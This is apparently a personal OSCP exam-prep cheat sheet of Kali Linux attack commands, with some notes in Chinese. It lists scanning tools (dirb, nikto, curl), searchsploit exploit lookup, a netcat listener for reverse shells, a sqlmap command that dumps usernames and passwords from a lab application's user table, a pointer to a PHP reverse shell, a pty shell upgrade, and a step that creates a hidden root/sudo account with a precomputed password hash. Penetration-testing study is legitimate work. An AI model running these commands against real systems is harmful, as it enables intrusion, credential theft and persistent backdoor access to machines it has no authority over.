# OSCP kail skills

## curl
$ curl -X OPTIONS -v http:<IP>

## dirb
 $dirb http://192.168.2.196
 
## md5 hash
https://hashes.com/en/decrypt/hash
 
## nc
$ nc -lvp 4444

## nikto 
> nikto是一個用來發現、檢查網頁伺服器全問題的工具。對目標主機會使用大量請求

$ nikto -h http://<IP>

## searchsploit
 $ searchsploit PACKAGE_NAME
 $ searchsploit -m NUMBER (下載)
     ![](https://i.imgur.com/U1TY2wQ.png)

## sqlmap
 $ sqlmap -u "http://172.20.10.5/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --level=3 -risk=3 -D jabcd0cs -T odm_user -C id,username,password --dump --batch


 
## 偷藏 (php 反彈 shell)

* kali 機底下:
 `$/usr/share/webshells/php/php-reverse-shell.php`

 
 
## 提權 
 $python -c 'import pty; pty.spawn("/bin/bash")'
 
 $python -c "import crypt: print crypt.crypt('password','password')"

 $sudo useradd -m -G root,sudo -p papAq5PwY/QQM vulnhubroot

###### tags:  `command` `OSCP`